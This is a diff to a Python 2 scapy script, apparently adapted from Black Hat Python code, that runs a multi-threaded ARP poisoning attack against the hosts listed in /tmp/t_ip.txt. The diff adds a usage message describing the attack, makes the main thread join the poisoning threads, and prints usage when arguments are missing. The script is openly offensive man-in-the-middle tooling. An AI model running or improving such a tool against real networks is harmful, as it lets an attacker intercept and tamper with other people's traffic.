@@ -14,6 +14,15 @@ import threading
 from scapy.all import *
 from termcolor import colored
 
+def usage():
+    print "%s is a script that performs an arp poisonning attack" % sys.argv[0]
+    print "for this script to work you need a file with different ip address's"
+    print "that are on the network the file has to be named t_ip.txt by default"
+    print "and located in the /tmp/ directory so: /tmp/t_ip.txt"
+    print
+    print "Usage:"
+    print "\t%s [gateway_ip] [interface]    => performs and arp poisonning attack" % sys.argv[0]
+
 #------ BHP code ------
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
@@ -95,7 +104,8 @@ class larp():
             self.thread_array[t_id].start()
             print colored("[^] ID: %d / Starting to ARP poison %s" % (t_id, ip), "blue")
             t_id += 1
-        print self.thread_array
+        for thread in self.thread_array:
+            thread.join()
 
 if __name__ == "__main__":
     try:
@@ -106,6 +116,7 @@ if __name__ == "__main__":
             interface = "wlp2s0"
     except:
         print >> sys.stderr, colored("[!] YOU DID NOT PROVIDE THE GOOD NUMBER OF ARGUMENTS", 'red')
+        usage()
         sys.exit(-1)
 
     ls = larp(gateway_ip, interface, "/tmp/t_ip.txt")
